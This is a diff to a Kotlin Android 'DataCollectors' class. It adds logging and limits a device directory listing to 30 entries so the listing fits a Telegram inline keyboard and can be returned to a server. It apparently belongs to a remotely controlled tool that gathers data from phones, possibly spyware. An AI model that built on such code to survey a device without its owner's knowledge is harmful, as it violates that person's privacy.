@@ -680,16 +680,27 @@ class DataCollectors(private val context: Context) {
     }
 
     fun listFiles(path: String): Any {
+        Log.i(TAG, "📂 listFiles: path=$path")
         return try {
             val dir = File(path)
-            
+
+            if (!dir.exists()) {
+                Log.w(TAG, "📂 listFiles: path does not exist: $path")
+            }
+            if (!dir.canRead()) {
+                Log.w(TAG, "📂 listFiles: cannot read path (no permission?): $path")
+            }
+
             val jsonList = JSONArray()
             var parentPath = ""
-            
+
             if (dir.exists() && dir.isDirectory) {
                 parentPath = dir.parentFile?.absolutePath ?: ""
-                val files = dir.listFiles()?.sortedBy { it.name } ?: emptyList()
-                for (f in files.take(100)) {
+                val allFiles = dir.listFiles()?.sortedBy { it.name } ?: emptyList()
+                Log.i(TAG, "📂 listFiles: found ${allFiles.size} entries in $path")
+                // ⚠️ Limit to 30 entries (Telegram inline keyboard has ~100 button limit;
+                // 30 keeps the message readable and avoids hitting API limits)
+                for (f in allFiles.take(30)) {
                     jsonList.put(JSONObject().apply {
                         put("name", f.name)
                         put("path", f.absolutePath)
@@ -697,8 +708,11 @@ class DataCollectors(private val context: Context) {
                         put("size", f.length())
                     })
                 }
+                if (allFiles.size > 30) {
+                    Log.i(TAG, "📂 listFiles: truncated to 30 of ${allFiles.size} entries")
+                }
             }
-            
+
             // ALWAYS return JSON (even if empty or error)
             // Server will handle empty lists gracefully
             val result = JSONObject().apply {
@@ -709,9 +723,11 @@ class DataCollectors(private val context: Context) {
                 if (!dir.exists()) put("error", "not_found")
                 if (dir.exists() && !dir.isDirectory) put("error", "not_directory")
             }
-            
+
+            Log.i(TAG, "📂 listFiles: returning ${jsonList.length()} entries (error=${result.optString("error", "none")})")
             CollectedData.JsonResult(result.toString())
         } catch (e: SecurityException) {
+            Log.e(TAG, "📂 listFiles: SecurityException for $path: ${e.message}")
             // Return JSON even on error
             val result = JSONObject().apply {
                 put("type", "file_list")
@@ -722,6 +738,7 @@ class DataCollectors(private val context: Context) {
             }
             CollectedData.JsonResult(result.toString())
         } catch (e: Exception) {
+            Log.e(TAG, "📂 listFiles: Exception for $path: ${e.message}", e)
             val result = JSONObject().apply {
                 put("type", "file_list")
                 put("path", path)
